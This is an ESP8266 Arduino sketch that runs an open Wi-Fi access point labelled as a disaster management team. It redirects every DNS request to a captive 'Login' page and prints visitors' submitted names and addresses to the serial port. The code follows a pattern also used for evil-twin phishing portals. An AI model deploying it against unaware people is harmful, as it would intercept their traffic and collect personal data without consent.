#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String login = ""
"<!DOCTYPE html>"
"<html>"
"<head>"
"  <title>Login</title>"
"  <meta charset=\"utf-8\">"
"  <style>"
"    body {"
"      color: #FFFFFF;"
"      background: rgb(0, 132, 121);"
"      margin: 0px;"
"    }"
"    #header {"
"      padding: 30px;"
"      font-size: 40px;"
"      background: rgb(36, 35, 51);"
"    }"
"    #login {"
"      text-align:center;"
"      padding: 100px;"
"      background: rgb(0, 132, 121);"
"    }"
"    #submit {"
"      padding: 10px;"
"    }"
"  </style>"
"</head>"
"<body>"
"<div id=\"header\">"
"  <width=\"60px\" height=\"60px\"> Disaster management team"
"</div>"
"<div id=\"login\">"
"  <form action=\"login2.php\" method=\"get\">"
"  <h2>Please enter your name and address:</h2>"
"   <div>Name: <input type=\"name\" name=\"code\" autofocus></div>"
"   <div>addr: <input type=\"address\" name=\"code\" autofocus></div>"
"   <div id=\"submit\"><input type=\"submit\" value=\"Submit\"></div>"
"  </form>"
"</div>"
"</body>"
"</html>";


String login3 = ""
"<!DOCTYPE html>"
"<html>"
"<head>"
"  <title>Login</title>"
"  <meta charset=\"utf-8\">"
"  <style>"
"    body {"
"      color: #FFFFFF;"
"      background: rgb(0, 132, 121);"
"      margin: 0px;"
"    }"
"    #header {"
"      padding: 30px;"
"      font-size: 40px;"
"      background: rgb(36, 35, 51);"
"    }"
"    #login {"
"      text-align:center;"
"      padding: 100px;"
"      background: rgb(0, 132, 121);"
"    }"
"    #submit {"
"      padding: 10px;"
"    }"
"  </style>"
"</head>"
"<body>"
"<div id=\"header\">"
"  <width=\"60px\" height=\"60px\"> Disaster management team"
"</div>"
"<div id=\"login\">"
"  <form action=\"login2.php\" method=\"get\">"
"  <h2></h2>"
"  <h3 style=\"color:Red;\" > Something has went worng. Please disconnect and then again connect with the wifi</h3>"
"  </form>"
"</div>"
"</body>"
"</html>";

String sniffed = "";

String login2 = ""
"<!DOCTYPE html>"
"<html>"
"<head>"
"  <title>Login</title>"
"  <meta charset=\"utf-8\">"
"  <style>"
"    body {"
"      color: #FFFFFF;"
"      background: rgb(0, 132, 121);"
"      margin: 0px;"
"    }"
"    #header {"
"      padding: 30px;"
"      font-size: 40px;"
"      background: rgb(36, 35, 51);"
"    }"
"    #login {"
"      text-align:center;"
"      padding: 100px;"
"      background: rgb(0, 132, 121);"
"    }"
"    #submit {"
"      padding: 10px;"
"    }"
"  </style>"
"</head>"
"<body>"
"<div id=\"header\">"
"  <width=\"60px\" height=\"60px\"> Disaster Management team"
"</div>"
"<div id=\"login\">"
"  <form action=\"login2.php\" method=\"get\">"
"  <h2>Please enter your name and address:</h2>"
"  <h3 style=\"color:White;\" > Your Information is succesfully submitted. For one more response</h3>"
"   <div>Name: <input type=\"name\" name=\"code\" autofocus></div>"
"   <div>addr: <input type=\"address\" name=\"code\" autofocus></div>"
"   <div id=\"submit\"><input type=\"submit\" value=\"Submit\"></div>"
"  </form>"
"</div>"
"</body>"
"</html>";

void setup() {
  
  Serial.begin(9600);
  

  struct softap_config cfgESP;
  cfgESP.max_connection = 32;
  wifi_softap_set_config(&cfgESP);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Disaster Manegement team");


  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  // redirect all requests to the login page
  webServer.onNotFound([]() {
    webServer.sendHeader("Location", String("http://www.SoS.com/login.php"), true);
    webServer.send ( 302, "text/plain", "");
  });
  
  webServer.on("/login.php", []() {
    webServer.send(200, "text/html", login);
  });

  webServer.on("/login2.php", []() {
    if(webServer.args() > 0) { 
      String message =  "## ; ";
      message  +=  webServer.arg(0) + " ; " + webServer.arg(1);
      Serial.println(message);
      webServer.send(200, "text/html", login2);  
      }
      else{
        webServer.send(200, "text/html", login3); 
      }
   
  });
  webServer.begin();
}


void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
 
}
